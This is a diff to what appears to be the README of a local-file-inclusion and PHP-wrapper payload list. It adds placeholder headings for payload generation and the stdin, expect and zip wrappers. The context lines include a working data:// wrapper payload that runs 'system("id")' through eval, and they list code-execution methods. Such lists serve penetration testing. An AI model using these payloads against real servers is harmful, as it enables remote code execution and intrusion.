@@ -15,6 +15,9 @@ Eg.
    
 > For more comprehensive testing, the placeholder can be combined with the payload in dedicated LFI/path-traversal payload list (`LF.md`, etc.). This would effectively combine the capabilities of both wordlists.
 
+### Script for automatic payload generation
+pending...
+
 ### Theory behind the payload values
 #### `php://filter` wrapper
 ```php
@@ -57,6 +60,9 @@ data://text/plain,<?php%20eval(\"system('id');\");%20?>
    
 3. utilizing various methods for achieving RCE: `system('id');`, `eval(\"system('id');\");`, `passthru(\"system('id');\");`
 
+#### `php://stdin` wrapper
+#### `expect://` wrapper
+#### `zip://` wrapper
 
 ### Examples of working payload
 1. ***bzip2 + base64 encode***
